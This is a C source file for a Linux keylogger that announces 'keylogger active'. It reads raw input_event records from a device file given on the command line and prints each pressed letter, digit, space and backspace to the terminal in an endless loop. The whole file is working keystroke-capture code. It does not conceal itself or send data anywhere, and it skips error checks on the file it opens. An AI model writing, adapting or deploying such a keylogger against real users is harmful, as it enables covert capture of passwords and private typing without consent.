#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<unistd.h>
#include<linux/input.h>
int main(int argc, char *argv[]){
	
	if(argc != 2){
		printf("usage: %s <event-name>\n",argv[0]);
		exit(-1);
	}
	
	printf("keylogger active...\n");
	printf("log: <event-name> : %s\n",argv[1]);
	
	//open the event file
	int fd = open(argv[1],O_RDONLY);
	printf("log: active file descriptor: %d\n",fd);	
	
	//read the event file into a buffer
	struct input_event ie;
	while(1){
		int rd_bytes = read(fd,&ie,sizeof(ie));
		if(ie.value==1){
			if(ie.code==2)
				printf("1");
			if(ie.code==3)
				printf("2");
			if(ie.code==4)
				printf("3");
			if(ie.code==5)
				printf("4");
			if(ie.code==6)
				printf("5");
			if(ie.code==7)
				printf("6");
			if(ie.code==8)
				printf("7");
			if(ie.code==9)
				printf("8");
			if(ie.code==10)
				printf("9");
			if(ie.code==11)
				printf("0");

			
			if(ie.code==16)
				printf("q");
			if(ie.code==17)
				printf("w");
			if(ie.code==18)
				printf("e");
			if(ie.code==19)
				printf("r");
			if(ie.code==20)
				printf("t");
			if(ie.code==21)
				printf("y");
			if(ie.code==22)
				printf("u");
			if(ie.code==23)
				printf("i");
			if(ie.code==24)
				printf("o");
			if(ie.code==25)
				printf("p");

			if(ie.code==30)
				printf("a");
			if(ie.code==31)
				printf("s");
			if(ie.code==32)
				printf("d");
			if(ie.code==33)
				printf("f");
			if(ie.code==34)
				printf("g");
			if(ie.code==35)
				printf("h");
			if(ie.code==36)
				printf("j");
			if(ie.code==37)
				printf("k");
			if(ie.code==38)
				printf("l");

			if(ie.code==44)
				printf("z");
			if(ie.code==45)
				printf("x");
			if(ie.code==46)
				printf("c");
			if(ie.code==47)
				printf("v");
			if(ie.code==48)
				printf("b");
			if(ie.code==49)
				printf("n");
			if(ie.code==50)
				printf("m");

			if(ie.code==57)
				printf(" ");
			if(ie.code==14)
				printf("⌫");
		}
		fflush(stdout);
	}
	return 0;
}
